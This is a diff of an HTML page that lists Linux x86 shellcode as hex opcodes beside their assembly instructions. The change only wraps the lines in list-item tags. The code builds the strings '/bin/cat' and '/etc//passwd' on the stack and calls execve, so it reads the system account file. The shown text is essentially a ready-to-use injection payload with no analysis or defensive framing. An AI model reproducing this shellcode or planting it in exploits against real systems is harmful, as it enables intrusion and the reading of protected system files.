@@ -9,21 +9,21 @@ Shellcode</p>
 
 <b>Hex-Opcodes             Assembly instruction</b>
 <ul>
-"\x31\xc0"                                           xorl    %eax,%eax       
-  "\x99"                                            cdq== movl eax edx  
-  "\x52"                                              push edx                    
-  "\x68\x2f\x63\x61\x74"                pushl 0x7461632f 
- "\x68\x2f\x62\x69\x6e"                pushl 0x6e69622f 
- "\x89\xe3"                                         mov ebx,esp   
- "\x52"                                             push edx      
-"\x68\x73\x73\x77\x64"                  pushl 0x64777373  
-"\x68\x2f\x2f\x70\x61"                pushl  0x61702f2f  
-"\x68\x2f\x65\x74\x63"               pushl 0x6374652f 
-"\x89\xe1"                                       mov ecx,esp  
-"\xb0\x0b"                                     mov  $0xb,%al                              
-"\x52"                                             push edx 
-"\x51"                                              push ecx 
-"\x53"                                             push ebx 
-"\x89\xe1"                                      mov ecx,esp   
- "\xcd\x80" ;                                    int 80h    
-    </ul>
+<li>"\x31\xc0"                                           xorl    %eax,%eax    </li>   
+ <li> "\x99"                                            cdq== movl eax edx  </li>   
+ <li> "\x52"                                              push edx                    </li>
+ <li> "\x68\x2f\x63\x61\x74"                pushl 0x7461632f  </li>
+ <li>"\x68\x2f\x62\x69\x6e"                pushl 0x6e69622f </li>
+<li> "\x89\xe3"                                         mov ebx,esp   </li>
+<li> "\x52"                                             push edx      </li>
+<li>"\x68\x73\x73\x77\x64"                  pushl 0x64777373 </li>  
+<li>"\x68\x2f\x2f\x70\x61"                pushl  0x61702f2f  </li>
+<li>"\x68\x2f\x65\x74\x63"               pushl 0x6374652f </li>
+<li>"\x89\xe1"                                       mov ecx,esp  </li>
+<li>"\xb0\x0b"                                     mov  $0xb,%al            </li>                  
+<li>"\x52"                                             push edx </li>
+<li>"\x51"                                              push ecx </li>
+<li>"\x53"                                             push ebx </li>
+<li>"\x89\xe1"                                      mov ecx,esp   </li>
+ <li>"\xcd\x80" ;                                    int 80h    </li>
+
